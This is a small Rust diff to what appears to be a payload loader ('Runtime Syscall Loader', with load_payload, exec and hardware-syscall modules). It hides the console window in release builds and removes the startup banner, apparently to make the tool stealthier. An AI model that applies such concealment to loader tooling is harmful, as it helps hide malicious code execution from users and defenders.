@@ -1,4 +1,4 @@
-//#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
+#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
 mod utils;
 mod load_payload;
 mod exec;
@@ -31,8 +31,6 @@ fn exit_program() -> ! {
 }
 
 fn start_program() {
-    println!("RSL - Runtime Syscall Loader");
-
     #[cfg(feature = "hw_syscall")]
     unsafe {
         syscall::hw_syscall::init_hw_syscalls();
